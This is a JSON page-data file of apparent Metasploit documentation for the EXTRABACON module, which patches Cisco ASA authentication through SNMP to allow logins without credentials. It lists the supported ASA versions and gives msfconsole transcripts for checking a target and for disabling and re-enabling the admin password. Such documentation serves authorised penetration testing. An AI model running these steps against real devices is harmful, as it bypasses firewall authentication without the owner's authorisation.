{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/auxiliary/admin/cisco/cisco_asa_extrabacon","result":{"data":{"moduleMetadataJson":{"id":"d2808052-46d7-5526-932d-b31f14aa2025","name":"Cisco ASA Authentication Bypass (EXTRABACON)","fullname":"auxiliary/admin/cisco/cisco_asa_extrabacon","description":"This module patches the authentication functions of a Cisco ASA\n          to allow uncredentialed logins. Uses improved shellcode for payload.","rank":300,"fields":{"detailsSlug":"/modules/details/auxiliary/admin/cisco/cisco_asa_extrabacon","documentationSlug":"/modules/documentation/auxiliary/admin/cisco/cisco_asa_extrabacon","referencesSlug":"/modules/references/auxiliary/admin/cisco/cisco_asa_extrabacon"},"documentation":{"html":"<h2 id=\"general-notes\" style=\"position:relative;\"><a href=\"#general-notes\" aria-label=\"general notes permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>General notes</h2>\n<p>This is using improved shellcode, has less stages than the Equation Group\nversion making it more reliable. This makes the SNMP payload packet ~150 less\nbytes. Also, the leaked version only supports 8.x, we have it working on 9.x\nversions.</p>\n<p>To add more version specific offsets, more details and a Lina file offset\nfinder are available at:</p>\n<p><a href=\"https://github.com/RiskSense-Ops/CVE-2016-6366\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://github.com/RiskSense-Ops/CVE-2016-6366</a></p>\n<h2 id=\"partial-list-of-supported-versions\" style=\"position:relative;\"><a href=\"#partial-list-of-supported-versions\" aria-label=\"partial list of supported versions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Partial list of supported versions</h2>\n<hr>\n<p>All of the leaked versions are available in the module</p>\n<ul>\n<li>8.x</li>\n<li>8.0(2)</li>\n<li>8.0(3)</li>\n<li>8.0(3)6</li>\n<li>8.0(4)</li>\n<li>8.0(4)32</li>\n<li>8.0(5)</li>\n<li>8.2(1)</li>\n<li>8.2(2)</li>\n<li>8.2(3)</li>\n<li>8.2(4)</li>\n<li>8.2(5)</li>\n<li>8.2(5)33 <code class=\"language-text\">*</code></li>\n<li>8.2(5)41 <code class=\"language-text\">*</code></li>\n<li>8.3(1)</li>\n<li>8.3(2)</li>\n<li>8.3(2)39 <code class=\"language-text\">*</code></li>\n<li>8.3(2)40 <code class=\"language-text\">*</code></li>\n<li>8.3(2)-npe <code class=\"language-text\">*</code> <code class=\"language-text\">**</code></li>\n<li>8.4(1)</li>\n<li>8.4(2)</li>\n<li>8.4(3)</li>\n<li>8.4(4)</li>\n<li>8.4(4)1 <code class=\"language-text\">*</code></li>\n<li>8.4(4)3 <code class=\"language-text\">*</code></li>\n<li>8.4(4)5 <code class=\"language-text\">*</code></li>\n<li>8.4(4)9 <code class=\"language-text\">*</code></li>\n<li>8.4(6)5 <code class=\"language-text\">*</code></li>\n<li>8.4(7) <code class=\"language-text\">*</code></li>\n<li>9.x</li>\n<li>9.0(1) <code class=\"language-text\">*</code></li>\n<li>9.1(1)4 <code class=\"language-text\">*</code></li>\n<li>9.2(1) <code class=\"language-text\">*</code></li>\n<li>9.2(2)8 <code class=\"language-text\">*</code></li>\n<li>9.2(3) <code class=\"language-text\">*</code></li>\n<li>9.2(4) <code class=\"language-text\">*</code></li>\n<li>9.2(4)13 <code class=\"language-text\">*</code></li>\n</ul>\n<p><code class=\"language-text\">*</code> new version support not part of the original Shadow Brokers leak</p>\n<p><code class=\"language-text\">**</code> We currently can't distinguish between normal and NPE versions from the SNMP strings. We've commented out the NPE offsets, as NPE is very rare (it is for exporting to places where encryption is crappy), but in the future, we'd like to incorporate these versions. Perhaps as a bool option?</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ul>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li><code class=\"language-text\">use auxiliary/admin/cisco/cisco_asa_extrabacon</code></li>\n<li><code class=\"language-text\">set RHOST x.x.x.x</code></li>\n<li><code class=\"language-text\">check</code></li>\n<li><code class=\"language-text\">run</code></li>\n<li>ssh admin@x.x.x.x, you will not need a valid password</li>\n<li><code class=\"language-text\">set MODE pass-enable</code></li>\n<li><code class=\"language-text\">run</code></li>\n<li>ssh admin@x.x.x.x, ensure fake password does not work</li>\n</ul>\n<h2 id=\"checking-for-a-vulnerable-version\" style=\"position:relative;\"><a href=\"#checking-for-a-vulnerable-version\" aria-label=\"checking for a vulnerable version permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Checking for a vulnerable version</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use auxiliary/admin/cisco/cisco_asa_extrabacon\nmsf auxiliary(cisco_asa_extrabacon) &gt; set rhost 192.168.1.1\nrhost =&gt; 192.168.1.1\nmsf auxiliary(cisco_asa_extrabacon) &gt; check\n\n[+] Payload for Cisco ASA version 8.2(1) available!\n[*] 192.168.1.1:161 The target appears to be vulnerable.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"disabling-administrative-password\" style=\"position:relative;\"><a href=\"#disabling-administrative-password\" aria-label=\"disabling administrative password permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disabling administrative password</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">  msf auxiliary(cisco_asa_extrabacon) &gt; set\nset ACTION            set ConsoleLogging    set Prompt            set RHOST             set TimestampOutput\nset CHOST             set LogLevel          set PromptChar        set RPORT             set VERBOSE\nset COMMUNITY         set MODE              set PromptTimeFormat  set SessionLogging    set VERSION\nset CPORT             set MinimumRank       set RETRIES           set TIMEOUT           set WORKSPACE\nmsf auxiliary(cisco_asa_extrabacon) &gt; set MODE pass-\n  set MODE pass-disable  set MODE pass-enable\nmsf auxiliary(cisco_asa_extrabacon) &gt; set MODE pass-disable\nMODE =&gt; pass-disable\nmsf auxiliary(cisco_asa_extrabacon) &gt; run\n\n[*] Building pass-disable payload for version 8.2(1)...\n  [*] Sending SNMP payload...\n  [+] Clean return detected!\n[!] Don&#39;t forget to run pass-enable after logging in!\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"re-enabling-administrative-password\" style=\"position:relative;\"><a href=\"#re-enabling-administrative-password\" aria-label=\"re enabling administrative password permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Re-enabling administrative password</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf auxiliary(cisco_asa_extrabacon) &gt; set MODE pass-enable\nMODE =&gt; pass-enable\nmsf auxiliary(cisco_asa_extrabacon) &gt; run\n\n[*] Building pass-enable payload for version 8.2(1)...\n  [*] Sending SNMP payload...\n  [+] Clean return detected!\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"d2808052-46d7-5526-932d-b31f14aa2025"}}}